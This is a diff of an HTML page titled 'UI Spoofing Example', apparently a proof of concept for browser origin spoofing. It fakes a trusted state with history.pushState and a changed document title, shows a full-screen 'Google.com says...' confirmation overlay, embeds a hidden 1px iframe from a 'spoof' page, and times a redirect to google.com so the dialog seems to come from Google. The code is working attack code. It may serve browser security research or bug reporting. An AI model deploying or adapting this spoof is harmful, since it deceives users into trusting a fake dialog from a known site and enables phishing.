@@ -1,62 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Trusted Container</title>
-
-<style>
-  body { font-family: system-ui; }
-  #panel {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: white;
-    z-index: 9999;
-    text-align: center;
-    padding-top: 40vh;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UI Spoofing Example</title>
+  <style>
+    #panel {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 9999;
+      text-align: center;
+      padding-top: 40vh;
+      color: white;
+    }
+  </style>
 </head>
 <body>
 
-<h2>Parent Page (Trusted)</h2>
-
-<button id="trigger">Open Secure Panel</button>
+<h1>Parent Page</h1>
+<button id="trigger">Open Trusted Panel</button>
 
 <div id="panel">
-  <h1>Secure System UI</h1>
-  <p>Loading…</p>
+  <h1>Google.com says...</h1>
+  <p>Are you sure you want to proceed?</p>
+  <button onclick="proceed()">Yes</button>
+  <button onclick="cancel()">No</button>
 </div>
 
-<iframe
-  src="https://cnfdnfial-ops.github.io/spoof/originB.html"
-  sandbox="allow-scripts"
-  style="width:1px;height:1px;border:0">
-</iframe>
+<iframe id="myiframe" src="https://cnfdnfial-ops.github.io/spoof/originB.html" sandbox="allow-scripts" style="width:1px;height:1px;border:0"></iframe>
 
 <script>
 const trigger = document.getElementById('trigger');
 const panel = document.getElementById('panel');
 
 trigger.onclick = () => {
-  // STEP 1 — fake trusted state
-  history.pushState({}, '', '/secure');
-  document.title = 'Secure System';
+  // Fake trusted state and show the panel
+  history.pushState({}, '', '/trusted');
+  document.title = 'Google.com says...';
 
   panel.style.display = 'block';
 };
 
-// STEP 2 — navigation race
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        // STEP 3 — cross-origin redirect
-        location.href = 'https://google.com:9090';
+        // Trigger redirect, making it look like we came from google.com
+        location.href = 'https://google.com';
       }, 80);
     });
   });
 });
+
+function proceed() {
+  alert('Proceeding with your action!');
+  panel.style.display = 'none';
+}
+
+function cancel() {
+  alert('Action cancelled!');
+  panel.style.display = 'none';
+}
 </script>
 
 </body>
